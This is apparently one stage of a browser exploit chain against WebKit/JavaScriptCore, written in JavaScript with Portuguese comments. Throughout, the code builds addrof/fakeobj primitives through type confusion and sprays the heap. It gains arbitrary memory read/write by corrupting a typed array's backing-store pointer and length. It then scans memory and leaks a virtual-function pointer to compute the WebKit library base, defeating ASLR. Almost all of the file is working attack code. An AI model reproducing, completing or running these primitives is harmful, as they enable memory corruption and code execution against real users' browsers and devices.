// js/script3/testArrayBufferVictimCrash.mjs (v128 - R88 Scanner Agressivo da Structure do DataView OOB)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Implementa um scanner agressivo no oob_array_buffer_real para encontrar
//   o verdadeiro ponteiro da Structure (ou StructureID) do oob_dataview_real.
// - Isso bypassa a suposição do offset 0x58 para o DataView.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute, 
    oob_write_absolute 
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v128_R88_OOBDataViewStructScanner";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Scanner Agressivo da Structure do OOB DataView ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    // Primitivas de addrof/fakeobj (usadas APENAS na Fase 4)
    let confused_array;
    let victim_array;
    let addrof_func;
    let fakeobj_func; 

    // A primitiva arbitrária real será baseada no Uint8Array corruptível
    let arb_rw_array = null; 

    // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
    let arb_read_stable = null;
    let arb_write_stable = null;

    // Variáveis que não dependem mais de addrof_func para serem vazadas
    let oob_dataview_structure_addr = null;

    // NOVO: Declarar a constante localmente, já que não pode ser importada de core_exploit
    // Embora não vamos mais confiar cegamente nela para o DataView, ainda pode ser útil.
    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 

    try {
        // Helper para definir as primitivas addrof/fakeobj (usadas APENAS na Fase 4)
        const setupAddrofFakeobj = () => {
            confused_array = [13.37]; 
            victim_array = [{ dummy: 0 }]; 
            
            addrof_func = (obj) => {
                victim_array[0] = obj;
                return doubleToInt64(confused_array[0]);
            };
            fakeobj_func = (addr) => { 
                confused_array[0] = int64ToDouble(addr);
                return victim_array[0];
            };
        };


        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        setupAddrofFakeobj(); // Configura as primitivas addrof/fakeobj APENAS UMA VEZ
        
        let leaker_phase4 = { obj_prop: null, val_prop: 0 };
        const arb_read_phase4 = (addr, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            const result_64 = doubleToInt64(leaker_phase4.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            if (size_bytes === 4) {
                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
            } else {
                leaker_phase4.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray_phase4 = [];
        for (let i = 0; i < 1000; i++) {
            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
        }
        const test_obj_phase4 = spray_phase4[500]; 
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr_phase4 = addrof_func(test_obj_phase4);
        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr_phase4 = test_obj_addr_phase4.add(0x10); 

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço ${prop_a_addr_phase4.toString(true)}...`, "info");
        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4);

        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4);
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50); 

        // ============================================================================
        // INÍCIO FASE 5: VAZAMENTO DIRETO DA STRUCTURE DO OOB_DATAVIEW_REAL (SCANNER)
        // ============================================================================
        logS3("--- FASE 5: SCANNER DA STRUCTURE DO OOB_DATAVIEW_REAL NO SEU ArrayBuffer ---", "subtest");
        
        const oob_dv = getOOBDataView();
        if (!oob_dv) throw new Error("DataView OOB não está disponível.");

        let found_dv_structure_ptr = null;
        let found_dv_structure_id = null;
        const SCAN_OOB_DV_RANGE_START = 0x0; 
        // O DataView provavelmente não estará muito longe do início do ArrayBuffer.
        // Vamos varrer até, digamos, 0x200 bytes do ArrayBuffer oob_array_buffer_real.
        const SCAN_OOB_DV_RANGE_END = 0x200; 
        const SCAN_OOB_DV_STEP = 0x8; 

        logS3(`    Varrendo o oob_array_buffer_real (do offset 0x0 até ${toHex(SCAN_OOB_DV_RANGE_END)}) para a Structure do DataView...`, "info");

        for (let offset = SCAN_OOB_DV_RANGE_START; offset < SCAN_OOB_DV_RANGE_END; offset += SCAN_OOB_DV_STEP) {
            let val_8_bytes = AdvancedInt64.Zero;
            try {
                val_8_bytes = oob_read_absolute(offset, 8); // Lendo diretamente do oob_array_buffer_real
                logS3(`    [OOB DV Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");

                // Check for valid Structure pointer pattern (0x7FFF...)
                if (!val_8_bytes.equals(AdvancedInt64.Zero) && (val_8_bytes.high() >>> 16) === 0x7FFF) { 
                    // Se o ponteiro está em um dos offsets esperados para a Structure dentro de um JSCell
                    if (offset === JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET || 
                        offset === OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET || // Antigo offset do DataView + 0x0
                        offset === OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) { // Antigo offset do DataView + 0x8
                        
                        found_dv_structure_ptr = val_8_bytes;
                        logS3(`        [OOB DV Scanner] --> CANDIDATO FORTE: Ponteiro da Structure do DataView em ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}!`, "good");
                        break; // Encontrou, pode parar
                    }
                }

                // Check for StructureID pattern (Uint32, not zero, relatively small)
                if (offset % 4 === 0) { // IDs podem estar em offsets de 4 bytes
                    const val_4_bytes = oob_read_absolute(offset, 4);
                    if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { 
                        // Se o ID está em um dos offsets esperados
                        if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET ||
                            offset === OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET) {
                            
                            found_dv_structure_id = val_4_bytes;
                            logS3(`        [OOB DV Scanner] --> CANDIDATO FORTE: StructureID do DataView em ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})!`, "good");
                            // Se acharmos o ID, podemos tentar resolver, mas o ponteiro é preferível.
                            // Não 'break' ainda para ver se encontramos um ponteiro.
                        }
                    }
                }

            } catch (scan_e) {
                logS3(`    [OOB DV Scanner] Erro lendo offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
            }
        }
        logS3("--- FIM DO SCANNER DA STRUCTURE DO OOB_DATAVIEW_REAL ---", "subtest");

        // Decisão do vazamento da Structure do oob_dataview_real
        let structure_addr = null; // Este será o ponteiro final da Structure
        if (found_dv_structure_ptr && !found_dv_structure_ptr.equals(AdvancedInt64.Zero)) {
            structure_addr = found_dv_structure_ptr;
            logS3(`[DECISÃO FINAL] Vazamento bem-sucedido: Ponteiro da Structure do oob_dataview_real: ${structure_addr.toString(true)}`, "good");
        } else if (typeof found_dv_structure_id === 'number' && found_dv_structure_id !== 0) {
            // Se encontramos o StructureID, mas não o ponteiro direto, tentaremos resolvê-lo.
            logS3(`[DECISÃO FINAL] Vazamento bem-sucedido: StructureID do oob_dataview_real: ${toHex(found_dv_structure_id)}. Tentando resolver para ponteiro da Structure...`, "info");
            
            // ATENÇÃO: Para resolver o StructureID para um ponteiro real, precisamos do WebKit Base Address
            // e do offset da tabela de Structures. Se não temos a base ainda, isso é uma dependência circular.
            // Para testar, vamos assumir temporariamente que podemos resolver o WebKit Base Address
            // ou pular para o próximo passo.
            // Por enquanto, se encontrarmos um ID, vamos marcar como "sucesso no vazamento" e parar para análise.
            final_result.message = `StructureID ${toHex(found_dv_structure_id)} do oob_dataview_real encontrado. Para resolver o ponteiro real da Structure, o WebKit Base Address e a Structure Table Base são necessários.`;
            final_result.success = true; 
            final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
            return final_result; 
        } else {
            throw new Error(`FALHA CRÍTICA: Não foi possível vazar a Structure (nem ponteiro, nem ID) do oob_dataview_real após varredura. Não há como prosseguir sem este vazamento básico.`);
        }
        
        // Se chegamos aqui, 'structure_addr' agora contém o ponteiro real da Structure do DataView.
        // Podemos usar este ponteiro para vazar a base da WebKit.
        
        // ============================================================================
        // CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
        // Isso ainda depende do addrof_func, mas agora testaremos com a base da Structure
        // obtida de forma independente.
        // ============================================================================
        logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");

        arb_rw_array = new Uint8Array(0x1000); 
        logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");

        // Continuamos a precisar de addrof_func para o arb_rw_array.
        // Se addrof_func não funcionar para o arb_rw_array, esta parte falhará.
        const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array); 
        logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
        if (arb_rw_array_ab_view_addr.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: Endereço do ArrayBufferView (${arb_rw_array_ab_view_addr.toString(true)}) é inválido ou não é um ponteiro de userland (0x7FFF...).`);
        }

        const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
        const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
        
        const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_addr, 8);
        const original_m_length = oob_read_absolute(arb_rw_array_m_length_orig_ptr_addr, 4);

        logS3(`    Original m_vector de arb_rw_array: ${original_m_vector.toString(true)}`, "info");
        logS3(`    Original m_length de arb_rw_array: ${toHex(original_m_length)}`, "info");

        arb_read_stable = (address, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 

            let result;
            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) result = arb_rw_array[0]; 
            else if (size_bytes === 2) result = dv.getUint16(0, true);
            else if (size_bytes === 4) result = dv.getUint32(0, true);
            else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
            else throw new Error("Tamanho de leitura inválido para arb_read_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
            return result;
        };

        arb_write_stable = (address, value, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 

            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) arb_rw_array[0] = value;
            else if (size_bytes === 2) dv.setUint16(0, value, true);
            else if (size_bytes === 4) dv.setUint32(0, value, true);
            else if (size_bytes === 8) dv.setFloat64(0, int64ToDouble(value), true);
            else throw new Error("Tamanho de escrita inválido para arb_write_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
        };
        logS3("Primitivas de L/E estáveis (arb_read_stable, arb_write_stable) construídas com sucesso.", "good");
        await PAUSE_S3(50);


        // ============================================================================
        // AGORA USAMOS A STRUCTURE VAZADA DO OOB_DATAVIEW_REAL PARA VAZAR A BASE WEBKIT
        // ============================================================================
        
        // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
        const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        const jsobject_put_addr = arb_read_stable(vfunc_put_ptr_addr, 8); 
        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
        logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
        if (!((jsobject_put_addr.high() >>> 16) === 0x7FFF || (jsobject_put_addr.high() === 0 && jsobject_put_addr.low() !== 0))) {
            logS3(`[Etapa 3] ALERTA: high part do JSObject::put Address inesperado: ${toHex(jsobject_put_addr.high())}`, "warn");
        }


        // 4. Calcular o endereço base da WebKit.
        const jsobject_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        logS3(`[Etapa 4] Offset conhecido de JSC::JSObject::put: ${jsobject_put_offset.toString(true)}`, "info");

        const webkit_base_addr = jsobject_put_addr.sub(jsobject_put_offset);
        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null;
        arb_rw_array = null; 
        arb_read_stable = null;
        arb_write_stable = null;
        
        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (OOB DataView Leak)' }
    };
}
